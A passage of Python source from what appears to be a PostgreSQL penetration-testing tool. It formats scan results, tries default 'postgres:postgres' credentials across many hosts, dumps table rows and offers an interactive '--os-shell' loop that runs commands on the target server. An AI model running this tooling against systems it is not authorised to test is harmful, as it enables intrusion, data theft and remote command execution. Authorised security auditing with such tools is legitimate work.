                        "database": record.get("database"),
                        "table": table_name,
                        "columns": selected_columns,
                        "rows": [str(row) for row in item.get("rows") or []],
                        "error": str(item.get("error")) if item.get("error") else None,
                    },
                    ensure_ascii=False,
                )
            )
        return lines

    prefix = _nxc_prefix(record)
    lines: list[str] = []
    for item in table_dumps:
        if not isinstance(item, dict):
            continue
        table_name = str(item.get("table") or "").strip() or "<unknown>"
        if columns_label:
            lines.append(f"{prefix} [*] Dump Table {table_name} (columns:{columns_label})")
        else:
            lines.append(f"{prefix} [*] Dump Table {table_name}")

        table_error = item.get("error")
        if table_error:
            lines.append(f"{prefix} <error:{_pg_text(table_error)}>")
            continue

        table_rows = item.get("rows")
        if isinstance(table_rows, list) and table_rows:
            for table_row in table_rows:
                lines.append(f"{prefix} {_pg_text(table_row)}")
        else:
            lines.append(f"{prefix} <no rows>")
    return lines


def _format_execute_detail_records(record: dict[str, Any], output_format: str) -> list[str]:
    execute_command = record.get("execute_command")
    if not execute_command:
        return []

    execute_ok = record.get("execute_ok")
    execute_output = record.get("execute_output")
    execute_error = record.get("execute_error")

    if output_format == "json":
        return [
            json.dumps(
                {
                    "timestamp": record.get("timestamp"),
                    "type": "execute_dump",
                    "service": "postgres",
                    "host": record.get("host"),
                    "port": record.get("port"),
                    "database": record.get("database"),
                    "command": str(execute_command),
                    "ok": execute_ok,
                    "output": [str(item) for item in execute_output] if isinstance(execute_output, list) else [],
                    "error": str(execute_error) if execute_error else None,
                },
                ensure_ascii=False,
            )
        ]

    prefix = _nxc_prefix(record)
    lines = [f"{prefix} [*] Execute Command", f"{prefix} command={_pg_text(execute_command)}"]
    if execute_ok is True:
        if isinstance(execute_output, list) and execute_output:
            for line in execute_output:
                lines.append(f"{prefix} {_pg_text(line)}")
        else:
            lines.append(f"{prefix} <no output>")
    elif execute_ok is False:
        lines.append(f"{prefix} <error:{_pg_text(execute_error or 'execute failed')}>")
    else:
        lines.append(f"{prefix} <not attempted>")
    return lines


def _format_record(record: dict[str, Any], output_format: str) -> str:
    if output_format == "json":
        payload = dict(record)
        payload.pop("provided_password", None)
        return json.dumps(payload, ensure_ascii=False)

    status = str(record.get("status") or "fail")
    prefix = _nxc_prefix(record)
    err = _clip(str(record.get("error") or "-"), 72)

    if status == "open_no_auth":
        return f"{prefix} [+] no-auth access {_caps_suffix(record)}"

    if status == "weak_default_creds":
        return f"{prefix} [+] postgres:postgres {_caps_suffix(record)}"

    if status == "valid_credentials":
        username = str(record.get("effective_username") or "postgres")
        provided_password = record.get("provided_password")
        password_text = (
            "<empty>"
            if provided_password == ""
            else str(provided_password)
            if provided_password is not None
            else "<none>"
        )
        return f"{prefix} [+] {username}:{password_text} {_caps_suffix(record)}"

    if status == "auth_required":
        if record.get("provided_credentials"):
            username = str(record.get("effective_username") or "postgres")
            provided_password = record.get("provided_password")
            password_text = (
                "<empty>"
                if provided_password == ""
                else str(provided_password)
                if provided_password is not None
                else "<none>"
            )
            return f"{prefix} [-] {username}:{password_text} auth failed"
        elif record.get("defcreds_enabled"):
            return f"{prefix} [-] postgres:postgres auth failed"
        else:
            return f"{prefix} [-] authentication required"

    fail_line = f"{prefix} [!] connection failed"
    return f"{fail_line} err={err}" if err != "-" else fail_line


def _render_colored_postgres_line(console: Console, line: str) -> bool:
    if not line.startswith("POSTGRES"):
        return False

    marker_color = {
        "[*]": "cyan",
        "[+]": "bright_green",
        "[-]": "yellow",
        "[!]": "red",
    }

    for marker in ("[!]", "[-]", "[+]", "[*]"):
        token = f" {marker} "
        if token not in line:
            continue

        left, right = line.split(token, 1)
        tag = "POSTGRES"
        rest = left[len(tag) :] if left.startswith(tag) else left

        spans: list[tuple[int, int, str]] = []
        auth_true = "(auth required:True)"
        auth_false = "(auth required:False)"
        auth_unknown = "(auth required:unknown)"

        idx_true = right.find(auth_true)
        if idx_true >= 0:
            spans.append((idx_true, idx_true + len(auth_true), "bright_green"))

        idx_false = right.find(auth_false)
        if idx_false >= 0:
            spans.append((idx_false, idx_false + len(auth_false), "red"))

        idx_unknown = right.find(auth_unknown)
        if idx_unknown >= 0:
            spans.append((idx_unknown, idx_unknown + len(auth_unknown), "yellow"))

        for fragment in ("(superuser:True)", "(execute:True)", "(read:True)"):
            idx = right.find(fragment)
            if idx >= 0:
                spans.append((idx, idx + len(fragment), "red"))

        table_match = re.search(r"\(tables:(\d+)\)", right)
        if table_match:
            table_count = int(table_match.group(1))
            if table_count > 0:
                spans.append((table_match.start(), table_match.end(), "orange"))

        if not spans:
            right_colored = console._paint(right, "white", sys.stdout)
        else:
            chunks: list[str] = []
            cursor = 0
            for start, end, color in sorted(spans, key=lambda item: item[0]):
                if start < cursor:
                    continue
                if start > cursor:
                    chunks.append(console._paint(right[cursor:start], "white", sys.stdout))
                chunks.append(console._paint(right[start:end], color, sys.stdout))
                cursor = end
            if cursor < len(right):
                chunks.append(console._paint(right[cursor:], "white", sys.stdout))
            right_colored = "".join(chunks)

        colored = (
            f"{console._paint(tag, 'blue', sys.stdout)}"
            f"{console._paint(rest, 'white', sys.stdout)} "
            f"{console._paint(marker, marker_color[marker], sys.stdout)} "
            f"{right_colored}"
        )
        console.plain(colored)
        return True

    return False


def _emit_line(out_fh: Any, emit_line: Callable[[str], None] | None, line: str) -> None:
    if out_fh is not None:
        out_fh.write(line + "\n")
        out_fh.flush()
    if emit_line is not None:
        emit_line(line)


def audit_postgres_targets(
    hosts: list[str],
    port: int,
    timeout: float,
    retries: int,
    workers: int,
    username: str | None,
    password: str | None,
    defcreds: bool,
    database: str,
    show_databases: bool,
    show_tables: bool,
    show_columns: bool,
    table_targets: list[str],
    table_columns: list[str],
    dump_table_rows: bool,
    execute_command: str | None,
    output_path: str | None,
    output_format: str,
    emit_line: Callable[[str], None] | None = None,
    logger: AttemptLogger | None = None,
    append_output: bool = False,
) -> tuple[int, int, int, int, int, int]:
    total = 0
    open_no_auth = 0
    weak = 0
    valid = 0
    auth_required = 0
    fail = 0

    out_fh: Any = None
    if output_path:
        os.makedirs(os.path.dirname(output_path) or ".", exist_ok=True)
        out_fh = open(output_path, "a" if append_output else "w", encoding="utf-8")

    try:
        with ThreadPoolExecutor(max_workers=max(1, workers)) as executor:
            future_map = {
                executor.submit(
                    _audit_postgres_host,
                    host,
                    port,
                    timeout,
                    retries,
                    username,
                    password,
                    defcreds,
                    database,
                    show_databases,
                    show_tables,
                    show_columns,
                    table_targets,
                    table_columns,
                    dump_table_rows,
                    execute_command,
                ): host
                for host in hosts
            }

            for future in as_completed(future_map):
                record = future.result()
                total += 1

                status = str(record.get("status") or "fail")
                if status == "open_no_auth":
                    open_no_auth += 1
                elif status == "weak_default_creds":
                    weak += 1
                elif status == "valid_credentials":
                    valid += 1
                elif status == "auth_required":
                    auth_required += 1
                else:
                    fail += 1

                if bool(record.get("is_postgres")):
                    _emit_line(out_fh, emit_line, _format_detect_record(record, output_format))

                _emit_line(out_fh, emit_line, _format_record(record, output_format))
                for database_line in _format_databases_detail_records(record, output_format):
                    _emit_line(out_fh, emit_line, database_line)
                for table_line in _format_tables_detail_records(record, output_format):
                    _emit_line(out_fh, emit_line, table_line)
                for table_columns_line in _format_table_columns_detail_records(record, output_format):
                    _emit_line(out_fh, emit_line, table_columns_line)
                for table_dump_line in _format_table_dump_detail_records(record, output_format):
                    _emit_line(out_fh, emit_line, table_dump_line)
                for execute_line in _format_execute_detail_records(record, output_format):
                    _emit_line(out_fh, emit_line, execute_line)

                if logger is not None:
                    logger.log(
                        "postgres",
                        (str(record.get("host") or "-"), int(record.get("port") or port)),
                        phase="audit",
                        status=record.get("status"),
                        auth_required=record.get("auth_required"),
                        auth_method=record.get("auth_method"),
                        superuser=record.get("superuser"),
                        can_execute_commands=record.get("can_execute_commands"),
                        can_read_tables=record.get("can_read_tables"),
                        readable_tables=record.get("readable_tables"),
                        execute_attempted=record.get("execute_attempted"),
                        execute_ok=record.get("execute_ok"),
                        execute_error=record.get("execute_error"),
                        error=record.get("error"),
                    )

    finally:
        if out_fh is not None:
            out_fh.close()

    return total, open_no_auth, weak, valid, auth_required, fail


def run_postgres_stage(args: argparse.Namespace, logger: AttemptLogger) -> int:
    console = Console(debug=args.debug)

    if args.timeout <= 0:
        console.error("--timeout must be > 0")
        return 2
    if args.retries < 0:
        console.error("--retries must be >= 0")
        return 2
    if args.username and args.password is None:
        console.error("--password is required when --username is set")
        return 2
    try:
        ports = collect_scan_ports(getattr(args, "ports", None))
    except ValueError as exc:
        console.error(f"failed to parse --port: {exc}")
        return 2
    if not ports:
        ports = [int(args.port)]

    targets = getattr(args, "targets", None) or getattr(args, "hosts", None)
    hosts_file = getattr(args, "hosts_file", None)
    if hosts_file:
        targets = f"{targets},{hosts_file}" if targets else hosts_file

    try:
        hosts = collect_scan_targets(targets)
    except (OSError, ValueError) as exc:
        console.error(f"failed to parse targets: {exc}")
        return 2

    if not hosts:
        console.error("postgres requires -t/--targets")
        return 2

    effective_username = args.username
    if args.password is not None and not effective_username:
        effective_username = "postgres"

    stream_to_stdout = not bool(args.output)

    def emit_line(line: str) -> None:
        if args.output_format != "txt":
            print(line, flush=True)
            return
        if line.startswith("POSTGRES") and all(token not in line for token in (" [*] ", " [+] ", " [-] ", " [!] ")):
            if console.render_tagged_payload_line(line, "POSTGRES", payload_color="orange"):
                return
            console.plain(line, color="white")
            return
        if _render_colored_postgres_line(console, line):
            return
        if args.debug:
            console.plain(line)

    execute_command = str(getattr(args, "execute", "") or "").strip() or None
    table_targets_raw = list(getattr(args, "tables", []) or [])
    table_targets: list[str] = []
    seen_table_targets: set[str] = set()
    for raw_value in table_targets_raw:
        for part in str(raw_value).split(","):
            table_name = part.strip()
            if not table_name:
                continue
            if table_name in seen_table_targets:
                continue
            seen_table_targets.add(table_name)
            table_targets.append(table_name)
    table_columns_raw = list(getattr(args, "columns", []) or [])
    table_columns, columns_error = _pg_normalize_column_names(table_columns_raw)
    if columns_error:
        console.error(columns_error)
        return 2
    dump_table_rows = bool(getattr(args, "dump", False))
    show_columns = bool(getattr(args, "show_columns", False))
    os_shell_mode = bool(getattr(args, "os_shell", False))

    if show_columns and not table_targets:
        console.error("--show-columns requires --table")
        return 2
    if table_columns and not table_targets:
        console.error("--column/--columns requires --table")
        return 2

    if os_shell_mode:
        if execute_command:
            console.error("--os-shell cannot be combined with --execute")
            return 2
        if args.output:
            console.error("--os-shell does not support --output; use --log instead")
            return 2
        if args.output_format != "txt":
            console.error("--os-shell requires --format txt")
            return 2
        if len(hosts) != 1:
            console.error("--os-shell requires exactly one target host")
            return 2
        if len(ports) != 1:
            console.error("--os-shell requires exactly one port (use --port with a single value)")
            return 2

        host = hosts[0]
        shell_port = int(ports[0])
        record = _audit_postgres_host(
            host=host,
            port=shell_port,
            timeout=args.timeout,
            retries=args.retries,
            username=effective_username,
            password=args.password,
            defcreds=args.defcreds,
            database=args.database,
            show_databases=args.show_databases,
            show_tables=args.show_tables,
            show_columns=show_columns,
            table_targets=table_targets,
            table_columns=table_columns,
            dump_table_rows=dump_table_rows,
            execute_command=None,
        )
        if bool(record.get("is_postgres")):
            emit_line(_format_detect_record(record, "txt"))
        emit_line(_format_record(record, "txt"))
        for database_line in _format_databases_detail_records(record, "txt"):
            emit_line(database_line)
        for table_line in _format_tables_detail_records(record, "txt"):
            emit_line(table_line)
        for table_columns_line in _format_table_columns_detail_records(record, "txt"):
            emit_line(table_columns_line)
        for table_dump_line in _format_table_dump_detail_records(record, "txt"):
            emit_line(table_dump_line)

        if not bool(record.get("is_postgres")):
            return 1
        if str(record.get("status") or "") in {"auth_required", "fail"}:
            return 1
        if record.get("can_execute_commands") is not True:
            console.error("os-shell unavailable: current role cannot execute server-side commands")
            return 1

        shell_username = str(record.get("effective_username") or "postgres")
        if args.password is not None:
            shell_password: str | None = args.password
        elif args.defcreds and args.username is None:
            shell_password = "postgres"
        else:
            shell_password = None

        console.success("postgres os-shell ready; type 'exit' or 'quit' to stop")
        while True:
            try:
                raw_command = input("pg-shell> ")
            except EOFError:
                console.plain("")
                break
            except KeyboardInterrupt:
                console.plain("")
                break

            command = raw_command.strip()
            if not command:
                continue
            if command.lower() in {"exit", "quit"}:
                break

            command_output, command_error = _pg_execute_remote_command(
                host=host,
                port=shell_port,
                timeout=args.timeout,
                retries=args.retries,
                username=shell_username,
                password=shell_password,
                database=args.database,
                command=command,
            )
            shell_record = dict(record)
            shell_record["timestamp"] = utc_now_iso()
            shell_record["execute_command"] = command
            shell_record["execute_attempted"] = True
            shell_record["execute_ok"] = command_error is None
            shell_record["execute_output"] = command_output
            shell_record["execute_error"] = command_error
            for execute_line in _format_execute_detail_records(shell_record, "txt"):
                emit_line(execute_line)
            if args.debug:
                logger.log(
                    "postgres",
                    (host, shell_port),
                    phase="os_shell",
                    command=command,
                    execute_ok=command_error is None,
                    execute_error=command_error,
                )
        return 0

    if args.debug and stream_to_stdout and args.output_format == "txt":
        if args.password is not None:
            mode = "provided-creds"
        elif args.defcreds:
            mode = "default-creds"
        else:
            mode = "detect-only"
        console.info(
            f"postgres audit started: hosts={len(hosts)} ports={len(ports)} timeout={args.timeout}s "
            f"workers={args.workers} retries={args.retries} mode={mode} database={args.database} format=txt"
        )
    if args.debug and not stream_to_stdout:
        if args.password is not None:
            mode = "provided-creds"
        elif args.defcreds:
            mode = "default-creds"
        else:
            mode = "detect-only"
        console.info(
            f"postgres audit started: hosts={len(hosts)} ports={len(ports)} timeout={args.timeout}s "
            f"workers={args.workers} retries={args.retries} mode={mode} database={args.database} "
            f"format={args.output_format} output={args.output}"
        )

    total = 0
    open_no_auth = 0
    weak = 0
    valid = 0
    auth_required = 0
    failed = 0
    try:
        for idx, audit_port in enumerate(ports):
            part_total, part_open, part_weak, part_valid, part_auth, part_failed = audit_postgres_targets(
                hosts=hosts,
                port=audit_port,
                timeout=args.timeout,
                retries=args.retries,
                workers=args.workers,
                username=effective_username,
                password=args.password,
                defcreds=args.defcreds,
                database=args.database,
                show_databases=args.show_databases,
                show_tables=args.show_tables,
                show_columns=show_columns,
                table_targets=table_targets,
                table_columns=table_columns,
                dump_table_rows=dump_table_rows,
                execute_command=execute_command,
                output_path=args.output,
                output_format=args.output_format,
                emit_line=emit_line,
                logger=logger if args.debug else None,
                append_output=idx > 0,
            )
            total += part_total
            open_no_auth += part_open
            weak += part_weak
            valid += part_valid
            auth_required += part_auth
            failed += part_failed
    except OSError as exc:
        console.error(f"failed to process postgres output: {exc}")
        return 2

    if stream_to_stdout:
        if args.debug and args.output_format == "txt":
            console.info(
                f"postgres audit complete: total={total} open={open_no_auth} "
                f"weak={weak} valid={valid} auth={auth_required} fail={failed}"
            )
        return 0

    if args.debug:
        console.info(
            f"postgres audit complete: total={total} open={open_no_auth} "
            f"weak={weak} valid={valid} auth={auth_required} fail={failed} "
            f"format={args.output_format} output={args.output}"
        )
    return 0
